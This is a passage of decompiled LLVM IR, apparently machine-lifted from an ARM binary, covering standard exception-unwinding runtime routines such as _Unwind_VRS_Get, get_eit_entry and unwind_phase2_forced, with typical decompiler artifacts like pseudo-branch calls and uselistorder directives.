  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_191f4 = icmp eq i32 %arg1, 0
  br i1 %v2_191f4, label %dec_label_pc_19208, label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %dec_label_pc_191f4, %dec_label_pc_191d8
  %v0_191fc = phi i32 [ %arg1, %dec_label_pc_191f4 ], [ %v0_191fc.pre, %dec_label_pc_191d8 ]
  %v3_19200 = ashr i32 %v0_191fc, 31
  br label %dec_label_pc_1920c

dec_label_pc_19208:                               ; preds = %dec_label_pc_191f4
  br label %dec_label_pc_1920c

dec_label_pc_1920c:                               ; preds = %dec_label_pc_191fc, %dec_label_pc_19208
  %v1_19214 = phi i32 [ %v0_191fc, %dec_label_pc_191fc ], [ %tmp8, %dec_label_pc_19208 ]
  %storemerge = phi i32 [ %v3_19200, %dec_label_pc_191fc ], [ %tmp, %dec_label_pc_19208 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_19214

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 5, 1, 2, 4, 6, 7, 8, 9, 3, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_23068.362, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 64, 70, 69, 63, 62, 79, 78, 67, 68, 66, 65, 77, 76, 75, 74, 73, 72, 71, 17, 25, 27, 34, 61, 43, 42, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 48, 16, 22, 47, 46, 26, 19, 21, 20, 58, 57, 14, 32, 31, 30, 33, 56, 45, 55, 54, 29, 28, 18, 60, 59, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 15, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1920c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1921c = icmp eq i32 %regclass, 0
  br i1 %v2_1921c, label %dec_label_pc_19224, label %dec_label_pc_19254

dec_label_pc_19224:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19224
  %v6_19228 = icmp eq i32 %representation, 0
  br i1 %v6_19228, label %dec_label_pc_19238, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19224
  br label %dec_label_pc_19260

bb8:                                              ; preds = %bb
  br label %dec_label_pc_19260

dec_label_pc_19238:                               ; preds = %bb
  %v3_19238 = mul i32 %regno, 4
  %v2_1923c = add i32 %v3_19238, %context
  %v1_19240 = add i32 %v2_1923c, 4
  %v2_19240 = inttoptr i32 %v1_19240 to i32*
  %v3_19240 = load i32, i32* %v2_19240, align 4
  %v2_1924c = bitcast i8* %valuep to i32*
  store i32 %v3_19240, i32* %v2_1924c, align 4
  ret i32 0

dec_label_pc_19254:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19254
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19254, %bb9
  %v0_1925c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_1925c)
  br label %dec_label_pc_19260

dec_label_pc_19260:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_19260, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_19268 = icmp eq i32 %regclass, 0
  br i1 %v2_19268, label %dec_label_pc_19270, label %dec_label_pc_192a0

dec_label_pc_19270:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19270
  %v6_19274 = icmp eq i32 %representation, 0
  br i1 %v6_19274, label %dec_label_pc_19284, label %bb8

.thread3:                                         ; preds = %dec_label_pc_19270
  br label %dec_label_pc_192ac

bb8:                                              ; preds = %bb
  br label %dec_label_pc_192ac

dec_label_pc_19284:                               ; preds = %bb
  %v3_19288 = mul i32 %regno, 4
  %v1_1928c = bitcast i8* %valuep to i32*
  %v2_1928c = load i32, i32* %v1_1928c, align 4
  %v2_19290 = add i32 %v3_19288, %context
  %v2_19298 = add i32 %v2_19290, 4
  %v3_19298 = inttoptr i32 %v2_19298 to i32*
  store i32 %v2_1928c, i32* %v3_19298, align 4
  ret i32 0

dec_label_pc_192a0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_192a0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_192a0, %bb9
  %v0_192a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_192a8)
  br label %dec_label_pc_192ac

dec_label_pc_192ac:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_192ac, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_192b4 = add i32 %context, 68
  %v2_192b4 = inttoptr i32 %v1_192b4 to i32*
  %v3_192b4 = load i32, i32* %v2_192b4, align 4
  ret i32 %v3_192b4

; uselistorder directives
  uselistorder i32 68, { 11, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7, 10 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_192c4 = add i32 %exc, 8
  %v2_192c4 = inttoptr i32 %v1_192c4 to i32*
  %v3_192c4 = load i32, i32* %v2_192c4, align 4
  %v2_192c8 = icmp eq i32 %v3_192c4, 0
  br i1 %v2_192c8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_192dc = xor i1 %v2_192c8, true
  call void @__pseudo_cond_branch(i1 %v2_192dc, i32 %v3_192c4)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_192f4 = call i32 @abort()
  ret i32 %v0_192f4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_19300 = call i32 @abort()
  ret i32 %v0_19300
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19304 = load i32, i32* @r4, align 4
  store i32 %v3_19304, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r5.global-to-local, align 4
  %v4_19314 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 132) to i32*), align 4
  %v2_19318 = icmp eq i32 %v4_19314, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_19324 = add i32 %return_address, -2
  store i32 %v1_19324, i32* %r4.global-to-local, align 4
  br i1 %v2_19318, label %dec_label_pc_1935c, label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_19314)
  %v2_1933c = icmp eq i32 %v1_19324, 0
  br i1 %v2_1933c, label %.thread, label %dec_label_pc_1937cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_1932c
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19344 = load i32, i32* %r6.global-to-local, align 4
  %v3_19344 = add i32 %v2_19344, 16
  %v4_19344 = inttoptr i32 %v3_19344 to i32*
  store i32 0, i32* %v4_19344, align 4
  br label %dec_label_pc_1934c

dec_label_pc_1934c:                               ; preds = %.thread, %.thread10, %dec_label_pc_194f4, %dec_label_pc_194e0, %dec_label_pc_194bc, %dec_label_pc_19494, %dec_label_pc_19394
  %v0_1934c = load i32, i32* %r2.global-to-local, align 4
  %v2_19354 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19354, i32* @r4, align 4
  ret i32 %v0_1934c

dec_label_pc_1935c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19364 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 20) to i32*), align 4
  %v4_19368 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 48) to i32*), align 4
  store i32 %v4_19368, i32* %r2.global-to-local, align 4
  %v2_1936c = sub i32 %v4_19364, %v4_19368
  %v3_19370 = sdiv i32 %v2_1936c, 8
  store i32 %v3_19370, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1937c

dec_label_pc_1937cthread-pre-split:               ; preds = %dec_label_pc_1932c
  %v3_1937c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1937c

dec_label_pc_1937c:                               ; preds = %dec_label_pc_1937cthread-pre-split, %dec_label_pc_1935c
  %v0_193c0.pre = phi i32 [ %v1_19324, %dec_label_pc_1937cthread-pre-split ], [ %v4_19368, %dec_label_pc_1935c ]
  %v1_19384 = phi i32 [ %v3_1937c.pr, %dec_label_pc_1937cthread-pre-split ], [ %v3_19370, %dec_label_pc_1935c ]
  %v2_19380 = icmp eq i32 %v1_19384, 0
  br i1 %v2_19380, label %dec_label_pc_19394, label %dec_label_pc_193b0.preheader

dec_label_pc_193b0.preheader:                     ; preds = %dec_label_pc_1937c
  %v2_19384 = add i32 %v1_19384, -1
  %v1_193e0 = add i32 %v0_193c0.pre, 8
  br label %dec_label_pc_193b0.outer

dec_label_pc_19394.loopexit:                      ; preds = %dec_label_pc_1940c
  br label %dec_label_pc_19394

dec_label_pc_19394:                               ; preds = %dec_label_pc_19394.loopexit, %dec_label_pc_1937c, %dec_label_pc_194d8
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1939c = load i32, i32* %r6.global-to-local, align 4
  %v2_1939c = add i32 %v1_1939c, 16
  %v3_1939c = inttoptr i32 %v2_1939c to i32*
  store i32 0, i32* %v3_1939c, align 4
  br label %dec_label_pc_1934c

dec_label_pc_193a4:                               ; preds = %dec_label_pc_19400
  %v3_193a4 = icmp ult i32 %storemerge40, %v0_19404
  br i1 %v3_193a4, label %dec_label_pc_193ac, label %dec_label_pc_1941c

dec_label_pc_193ac:                               ; preds = %dec_label_pc_193a4
  %v1_193ac = add nsw i32 %v3_193b8, 1
  br label %dec_label_pc_193b0.outer

dec_label_pc_193b0.outer:                         ; preds = %dec_label_pc_193ac, %dec_label_pc_193b0.preheader
  %v1_1940c.ph = phi i32 [ %v1_193ac, %dec_label_pc_193ac ], [ 0, %dec_label_pc_193b0.preheader ]
  %v0_193b0.ph = phi i32 [ %v0_193b0, %dec_label_pc_193ac ], [ %v2_19384, %dec_label_pc_193b0.preheader ]
  br label %dec_label_pc_193b0

dec_label_pc_193b0:                               ; preds = %dec_label_pc_193b0.outer, %dec_label_pc_19414
  %v0_193b0 = phi i32 [ %v1_19414, %dec_label_pc_19414 ], [ %v0_193b0.ph, %dec_label_pc_193b0.outer ]
  %v2_193b0 = add i32 %v0_193b0, %v1_1940c.ph
  %tmp = icmp slt i32 %v2_193b0, 0
  %v4_193b4 = zext i1 %tmp to i32
  %v5_193b4 = add i32 %v4_193b4, %v2_193b0
  %v3_193b8 = sdiv i32 %v5_193b4, 2
  %v3_193bc = mul i32 %v3_193b8, 8
  store i32 %v3_193bc, i32* @ip, align 4
  %v2_193c0 = add i32 %v3_193bc, %v0_193c0.pre
  %v3_193c0 = inttoptr i32 %v2_193c0 to i32*
  %v4_193c0 = load i32, i32* %v3_193c0, align 4
  %v1_193c4 = and i32 %v4_193c0, 1073741824
  %v2_193c4 = icmp eq i32 %v1_193c4, 0
  %v2_193c8 = or i32 %v4_193c0, -2147483648
  %tmp79 = bitcast i32 %v4_193c0 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_193cc = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_193c4, i32 %v2_193cc, i32 %v2_193c8
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_193d0 = icmp eq i32 %v2_19384, %v3_193b8
  store i32 %v2_193c0, i32* %r7.global-to-local, align 4
  br i1 %v9_193d0, label %dec_label_pc_19400, label %dec_label_pc_193e0

dec_label_pc_193e0:                               ; preds = %dec_label_pc_193b0
  %v2_193e4 = add i32 %v3_193bc, %v1_193e0
  %v3_193e4 = inttoptr i32 %v2_193e4 to i32*
  %v4_193e4 = load i32, i32* %v3_193e4, align 4
  %v1_193ec = and i32 %v4_193e4, 1073741824
  %v2_193ec = icmp eq i32 %v1_193ec, 0
  %v2_193f0 = or i32 %v4_193e4, -2147483648
  %tmp81 = bitcast i32 %v4_193e4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_193f4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_193ec, i32 %v2_193f4, i32 %v2_193f0
  %v1_193f8 = add i32 %v2_193e4, -1
  %v2_193fc = add i32 %storemerge39, %v1_193f8
  br label %dec_label_pc_19400

dec_label_pc_19400:                               ; preds = %dec_label_pc_193b0, %dec_label_pc_193e0
  %storemerge40 = phi i32 [ %v2_193fc, %dec_label_pc_193e0 ], [ -1, %dec_label_pc_193b0 ]
  %v2_19400 = add i32 %storemerge, %v2_193c0
  %v0_19404 = load i32, i32* %r4.global-to-local, align 4
  %v3_19404 = icmp ult i32 %v0_19404, %v2_19400
  br i1 %v3_19404, label %dec_label_pc_1940c, label %dec_label_pc_193a4

dec_label_pc_1940c:                               ; preds = %dec_label_pc_19400
  %v9_1940c = icmp eq i32 %v3_193b8, %v1_1940c.ph
  br i1 %v9_1940c, label %dec_label_pc_19394.loopexit, label %dec_label_pc_19414

dec_label_pc_19414:                               ; preds = %dec_label_pc_1940c
  %v1_19414 = add nsw i32 %v3_193b8, -1
  br label %dec_label_pc_193b0

dec_label_pc_1941c:                               ; preds = %dec_label_pc_193a4
  %v2_1941c = load i32, i32* %v3_193c0, align 4
  %v1_19420 = and i32 %v2_1941c, 1073741824
  %v2_19420 = icmp eq i32 %v1_19420, 0
  %v2_19424 = or i32 %v2_1941c, -2147483648
  %tmp83 = bitcast i32 %v2_1941c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_19428 = bitcast float %tmp84 to i32
  %v0_1942c = select i1 %v2_19420, i32 %v2_19428, i32 %v2_19424
  %v2_1942c = add i32 %v0_1942c, %v2_193c0
  %v1_19430 = load i32, i32* %r6.global-to-local, align 4
  %v2_19430 = add i32 %v1_19430, 72
  %v3_19430 = inttoptr i32 %v2_19430 to i32*
  store i32 %v2_1942c, i32* %v3_19430, align 4
  %v0_19434 = load i32, i32* %r7.global-to-local, align 4
  %v1_19434 = add i32 %v0_19434, 4
  %v2_19434 = inttoptr i32 %v1_19434 to i32*
  %v3_19434 = load i32, i32* %v2_19434, align 4
  %v7_19438 = icmp eq i32 %v3_19434, 1
  br i1 %v7_19438, label %.thread10, label %dec_label_pc_1944c

.thread10:                                        ; preds = %dec_label_pc_1941c
  %v1_19438 = add i32 %v3_19434, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_19444 = load i32, i32* %r6.global-to-local, align 4
  %v3_19444 = add i32 %v2_19444, 16
  %v4_19444 = inttoptr i32 %v3_19444 to i32*
  store i32 %v1_19438, i32* %v4_19444, align 4
  br label %dec_label_pc_1934c

dec_label_pc_1944c:                               ; preds = %dec_label_pc_1941c
  %v1_1944c = icmp slt i32 %v3_19434, 0
  br i1 %v1_1944c, label %.thread38, label %dec_label_pc_19464

.thread38:                                        ; preds = %dec_label_pc_1944c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_19458 = load i32, i32* %r6.global-to-local, align 4
  %v5_19458 = add i32 %v4_19458, 76
  %v6_19458 = inttoptr i32 %v5_19458 to i32*
  store i32 %v1_19434, i32* %v6_19458, align 4
  %v3_1945c = load i32, i32* %r2.global-to-local, align 4
  %v4_1945c = load i32, i32* %r6.global-to-local, align 4
  %v5_1945c = add i32 %v4_1945c, 80
  %v6_1945c = inttoptr i32 %v5_1945c to i32*
  store i32 %v3_1945c, i32* %v6_1945c, align 4
  br label %dec_label_pc_19484

dec_label_pc_19464:                               ; preds = %dec_label_pc_1944c
  %v1_19464 = and i32 %v3_19434, 1073741824
  %v2_19464 = icmp eq i32 %v1_19464, 0
  %v2_19468 = or i32 %v3_19434, -2147483648
  %tmp85 = bitcast i32 %v3_19434 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1946c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_19464, i32 %v2_1946c, i32 %v2_19468
  %v1_19470 = add i32 %storemerge42, 4
  %v2_19474 = add i32 %v1_19470, %v0_19434
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1947c = load i32, i32* %r6.global-to-local, align 4
  %v2_1947c = add i32 %v1_1947c, 76
  %v3_1947c = inttoptr i32 %v2_1947c to i32*
  store i32 %v2_19474, i32* %v3_1947c, align 4
  %v0_19480 = load i32, i32* %r2.global-to-local, align 4
  %v1_19480 = load i32, i32* %r6.global-to-local, align 4
  %v2_19480 = add i32 %v1_19480, 80
  %v3_19480 = inttoptr i32 %v2_19480 to i32*
  store i32 %v0_19480, i32* %v3_19480, align 4
  br label %dec_label_pc_19484

dec_label_pc_19484:                               ; preds = %.thread38, %dec_label_pc_19464
  %v0_19484 = load i32, i32* %r6.global-to-local, align 4
  %v1_19484 = add i32 %v0_19484, 76
  %v2_19484 = inttoptr i32 %v1_19484 to i32*
  %v3_19484 = load i32, i32* %v2_19484, align 4
  store i32 %v3_19484, i32* %r2.global-to-local, align 4
  %v1_19488 = inttoptr i32 %v3_19484 to i32*
  %v2_19488 = load i32, i32* %v1_19488, align 4
  %v1_1948c = icmp slt i32 %v2_19488, 0
  br i1 %v1_1948c, label %dec_label_pc_194b0, label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %dec_label_pc_19484
  %v1_19494 = and i32 %v2_19488, 1073741824
  %v2_19494 = icmp eq i32 %v1_19494, 0
  %v2_19498 = or i32 %v2_19488, -2147483648
  %tmp87 = bitcast i32 %v2_19488 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1949c = bitcast float %tmp88 to i32
  %v0_194a0 = select i1 %v2_19494, i32 %v2_1949c, i32 %v2_19498
  %v2_194a0 = add i32 %v0_194a0, %v3_19484
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_194a8 = add i32 %v0_19484, 16
  %v3_194a8 = inttoptr i32 %v2_194a8 to i32*
  store i32 %v2_194a0, i32* %v3_194a8, align 4
  br label %dec_label_pc_1934c

dec_label_pc_194b0:                               ; preds = %dec_label_pc_19484
  %v3_194b0 = udiv i32 %v2_19488, 16777216
  %v1_194b4 = urem i32 %v3_194b0, 16
  %v2_194b4 = icmp eq i32 %v1_194b4, 0
  br i1 %v2_194b4, label %dec_label_pc_194bc, label %dec_label_pc_194d0

dec_label_pc_194bc:                               ; preds = %dec_label_pc_194b0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_194c4 = add i32 %v0_194c4, -37184
  %v2_194c8 = add i32 %v0_19484, 16
  %v3_194c8 = inttoptr i32 %v2_194c8 to i32*
  store i32 %v2_194c4, i32* %v3_194c8, align 4
  br label %dec_label_pc_1934c

dec_label_pc_194d0:                               ; preds = %dec_label_pc_194b0
  %v7_194d0 = icmp eq i32 %v1_194b4, 1
  br i1 %v7_194d0, label %dec_label_pc_194f4, label %dec_label_pc_194d8

dec_label_pc_194d8:                               ; preds = %dec_label_pc_194d0
  %v7_194d8 = icmp eq i32 %v1_194b4, 2
  br i1 %v7_194d8, label %dec_label_pc_194e0, label %dec_label_pc_19394

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194d8
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_194e8 = add i32 %v0_194e8, -37200
  %v2_194ec = add i32 %v0_19484, 16
  %v3_194ec = inttoptr i32 %v2_194ec to i32*
  store i32 %v2_194e8, i32* %v3_194ec, align 4
  br label %dec_label_pc_1934c

dec_label_pc_194f4:                               ; preds = %dec_label_pc_194d0
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194fc = load i32, i32* %r5.global-to-local, align 4
  %v2_194fc = add i32 %v0_194fc, -37192
  %v2_19500 = add i32 %v0_19484, 16
  %v3_19500 = inttoptr i32 %v2_19500 to i32*
  store i32 %v2_194fc, i32* %v3_19500, align 4
  br label %dec_label_pc_1934c

; uselistorder directives
  uselistorder i32 %v1_194b4, { 2, 1, 0 }
  uselistorder i32 %v0_19484, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_19434, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_19404, { 1, 0 }
  uselistorder i32 %v3_193bc, { 2, 1, 0 }
  uselistorder i32 %v3_193b8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_193b0, { 1, 0 }
  uselistorder i32 %v0_193b0, { 1, 0 }
  uselistorder i32 %v2_19384, { 1, 0 }
  uselistorder i32 %v0_193c0.pre, { 1, 0 }
  uselistorder i32 %v3_19370, { 1, 0 }
  uselistorder i32 %v1_19324, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 9, 10, 11, 13, 12 }
  uselistorder i32 132, { 0, 6, 7, 8, 9, 4, 5, 2, 3, 1 }
  uselistorder label %dec_label_pc_19484, { 1, 0 }
  uselistorder label %dec_label_pc_19400, { 1, 0 }
  uselistorder label %dec_label_pc_193b0, { 1, 0 }
  uselistorder label %dec_label_pc_19394, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1934c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1950c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1950c:
  %v0_1950c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1950c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1950c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1950c, %bb
  %v10_19514 = phi i32 [ %arg1, %dec_label_pc_1950c ], [ 0, %bb ]
  ret i32 %v10_19514

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_19528 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1953c = inttoptr i32 %v1_19528 to i32*
  %v2_1953c = load i32, i32* %v1_1953c, align 4
  store i32 %v2_1953c, i32* %r0.global-to-local, align 4
  %v12_1953c = add i32 %entry_vrs, 20
  %v1_19548 = inttoptr i32 %v12_1953c to i32*
  %v2_19548 = load i32, i32* %v1_19548, align 4
  store i32 %v2_19548, i32* %r0.global-to-local, align 4
  %v12_19548 = add i32 %entry_vrs, 36
  %v1_19550 = inttoptr i32 %v12_19548 to i32*
  %v2_19550 = load i32, i32* %v1_19550, align 4
  store i32 %v2_19550, i32* %r0.global-to-local, align 4
  %v12_19550 = add i32 %entry_vrs, 52
  store i32 %v12_19550, i32* @ip, align 4
  %v13_19554 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_19554, i32* @lr, align 4
  %v1_19558 = inttoptr i32 %v12_19550 to i32*
  %v2_19558 = load i32, i32* %v1_19558, align 4
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  %v9_19558 = add i32 %entry_vrs, 64
  %v10_19558 = inttoptr i32 %v9_19558 to i32*
  %v11_19558 = load i32, i32* %v10_19558, align 4
  store i32 0, i32* @r4, align 4
  %v1_19560 = add i32 %ucbp, 12
  %v2_19560 = inttoptr i32 %v1_19560 to i32*
  %v3_19560 = load i32, i32* %v2_19560, align 4
  store i32 %v2_19558, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_19578 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19558)
  store i32 %v2_19578, i32* %r0.global-to-local, align 4
  %v0_1957c = load i32, i32* @r6, align 4
  %v1_1957c = load i32, i32* @r4, align 4
  %v9_1957c = icmp eq i32 %v0_1957c, %v1_1957c
  store i32 %v2_19578, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1957c, label %dec_label_pc_19590, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1959c

dec_label_pc_19590:                               ; preds = %entry
  store i32 %v0_1957c, i32* @r4, align 4
  br label %dec_label_pc_19598

dec_label_pc_19598:                               ; preds = %dec_label_pc_19660, %dec_label_pc_19590
  br label %dec_label_pc_1959c

dec_label_pc_1959c:                               ; preds = %.thread, %dec_label_pc_19598
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_19598 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1959c = icmp eq i32 %v2_19578, 0
  br i1 %v2_1959c, label %dec_label_pc_19614, label %.thread2.dec_label_pc_195b0_crit_edge

.thread2.dec_label_pc_195b0_crit_edge:            ; preds = %dec_label_pc_1959c
  br label %dec_label_pc_195b0

dec_label_pc_195b0:                               ; preds = %.thread2.dec_label_pc_195b0_crit_edge, %dec_label_pc_19614
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_195c0 = load i32, i32* @r5, align 4
  store i32 %v0_195c0, i32* @r3, align 4
  store i32 103888, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_19560)
  br i1 false, label %dec_label_pc_195d8, label %dec_label_pc_19600

dec_label_pc_195d8:                               ; preds = %dec_label_pc_195b0
  br i1 undef, label %dec_label_pc_195e0, label %dec_label_pc_19604

dec_label_pc_195e0:                               ; preds = %dec_label_pc_195d8
  br i1 undef, label %dec_label_pc_19660, label %dec_label_pc_195f8

dec_label_pc_195f8:                               ; preds = %dec_label_pc_195e0
  br i1 undef, label %dec_label_pc_19658, label %dec_label_pc_19600

dec_label_pc_19600:                               ; preds = %dec_label_pc_195b0, %dec_label_pc_195f8
  br label %dec_label_pc_19604

dec_label_pc_19604:                               ; preds = %dec_label_pc_195d8, %dec_label_pc_19600
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_19614:                               ; preds = %dec_label_pc_1959c
  store i32 %v11_19558, i32* @r3, align 4
  %v2_19618 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_19618, i32* @r4, align 4
  %v1_1961c = load i32, i32* @r5, align 4
  %v2_1961c = add i32 %v1_1961c, 20
  %v3_1961c = inttoptr i32 %v2_1961c to i32*
  store i32 %v11_19558, i32* %v3_1961c, align 4
  store i32 %v2_19618, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1962c = call i32 @memcpy()
  %v0_19634 = load i32, i32* @r6, align 4
  store i32 %v0_19634, i32* %r0.global-to-local, align 4
  %v0_19638 = load i32, i32* @r5, align 4
  %v1_1963c = add i32 %v0_19638, 16
  %v2_1963c = inttoptr i32 %v1_1963c to i32*
  %v3_1963c = load i32, i32* %v2_1963c, align 4
  store i32 %v3_1963c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1963c)
  %v0_1964c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1964c, i32* @r4, align 4
  br label %dec_label_pc_195b0

dec_label_pc_19658:                               ; preds = %dec_label_pc_195f8
  br label %dec_label_pc_19660

dec_label_pc_19660:                               ; preds = %dec_label_pc_195e0, %dec_label_pc_19658
  br label %dec_label_pc_19598

; uselistorder directives
  uselistorder i32 %v11_19558, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 10, 1, 2, 3, 4, 5, 0 }
  uselistorder i32 ()* @memcpy, { 0, 6, 5, 2, 1, 4, 3, 8, 7 }
  uselistorder i32 304, { 1, 0 }
